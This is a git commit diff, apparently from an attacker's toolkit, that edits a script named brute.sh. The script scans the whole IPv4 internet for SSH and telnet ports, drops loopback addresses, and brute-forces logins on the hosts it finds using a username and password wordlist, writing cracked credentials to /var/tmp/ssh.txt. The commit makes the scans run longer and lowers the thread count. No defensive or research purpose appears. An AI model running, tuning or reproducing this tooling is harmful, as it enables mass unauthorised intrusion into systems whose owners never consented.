d9cc755fdb355b2ab6b26b67726937c0c84754b2
root <logical>
2026-08-01 21:34:31 -0500

    ok

--- scripts/brute.sh
+++ scripts/brute.sh
@@ -32,9 +32,10 @@ tar -xf brutus
 
 chmod  +x brutus 
 
-timeout  20s     ./nabu  -p 22 -host    0.0.0.0/0     >    ips_nabu     #ssh
+timeout  120s     ./nabu  -p 22 -host    0.0.0.0/0     >    ips_nabu     #ssh
  
-timeout  20s     ./nabu  -p 23   -host   0.0.0.0/0     >>    ips_nabu  #telnet
+
+timeout  600s     ./nabu  -p 23   -host   0.0.0.0/0     >>    ips_nabu  #telnet
 
 
 
@@ -43,7 +44,8 @@ grep -v "^127\." ips_nabu >  my_ips
 
 
 
-./brutus creds   --targets-file   my_ips      -U  lista.txt   -P  lista.txt  -q  -t 50     >     /var/tmp/ssh.txt  
+
+./brutus creds   --targets-file   my_ips      -U  lista.txt   -P  lista.txt  -q  -t 20    >     /var/tmp/ssh.txt  
  
 
 
